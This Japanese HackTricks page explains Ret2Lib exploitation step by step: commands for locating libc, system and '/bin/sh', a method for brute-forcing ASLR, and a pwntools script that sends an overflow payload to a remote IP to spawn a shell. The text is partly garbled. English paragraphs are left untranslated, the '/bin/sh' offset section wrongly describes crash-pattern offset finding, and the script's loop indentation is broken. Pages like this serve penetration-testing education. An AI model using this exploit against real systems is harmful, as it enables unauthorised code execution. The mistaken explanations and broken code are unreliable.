<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>


**脆弱なバイナリを見つけ、Ret2Libを使用して攻撃できると思った場合、以下は基本的な手順です。**

# **ホスト内部**にいる場合

## **libcのアドレス**を見つけることができます
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
ASLRがlibcのアドレスを変更しているかどうかを確認したい場合は、次の操作を行うことができます：
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## システム関数のオフセットを取得する

To get the offset of the system function, we can use the `nm` command to list the symbols in a binary file. The system function is usually located in the libc library, so we need to find the address of the system function in libc.

システム関数のオフセットを取得するために、`nm`コマンドを使用してバイナリファイル内のシンボルをリストアップします。システム関数は通常、libcライブラリに存在するため、libc内のシステム関数のアドレスを見つける必要があります。

First, we need to identify the libc library used by the target binary. We can do this by running the `ldd` command followed by the path to the binary. Look for the libc library in the output.

まず、ターゲットバイナリが使用しているlibcライブラリを特定する必要があります。これは、`ldd`コマンドをバイナリのパスに続けて実行することで行うことができます。出力からlibcライブラリを探してください。

Once we have identified the libc library, we can use the `nm` command to list the symbols in the library. Pipe the output of `nm` to `grep` and search for the system function. The output will include the address of the system function.

libcライブラリを特定したら、`nm`コマンドを使用してライブラリ内のシンボルをリストアップします。`nm`の出力を`grep`にパイプし、システム関数を検索します。出力にはシステム関数のアドレスが含まれます。

The offset of the system function can be calculated by subtracting the base address of the libc library from the address of the system function.

システム関数のオフセットは、libcライブラリのベースアドレスからシステム関数のアドレスを引くことで計算できます。
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## "/bin/sh"のオフセットを取得する

To get the offset of "/bin/sh" in the binary, we can use the following steps:

1. Create a pattern of characters using a pattern generation tool like `pattern_create.rb` or `msf-pattern_create`.
2. Inject the pattern into the vulnerable program, causing it to crash.
3. Identify the offset value by analyzing the crash. This can be done by using a pattern matching tool like `pattern_offset.rb` or `msf-pattern_offset`.
4. Use the obtained offset value to calculate the address of "/bin/sh" in memory.

By following these steps, we can determine the offset of "/bin/sh" and use it in our exploit.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

プロセスが毎回（ネットワークサーバーの場合）話すたびに**子プロセス**を作成している場合、そのファイルを**読み取る**ことを試してください（おそらくroot権限が必要です）。

ここでは、プロセス内の**libcが正確にどこにロードされているか**と、プロセスのすべての子プロセスに**どこにロードされるか**がわかります。

![](<../../.gitbook/assets/image (95).png>)

この場合、**0xb75dc000**にロードされています（これがlibcのベースアドレスになります）

## gdb-pedaを使用する

gdb-pedaを使用して、**system**関数、**exit**関数、および文字列**"/bin/sh"**のアドレスを取得します。
```
p system
p exit
find "/bin/sh"
```
# ASLRのバイパス

libcのベースアドレスをブルートフォースで試すことができます。
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# コード
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
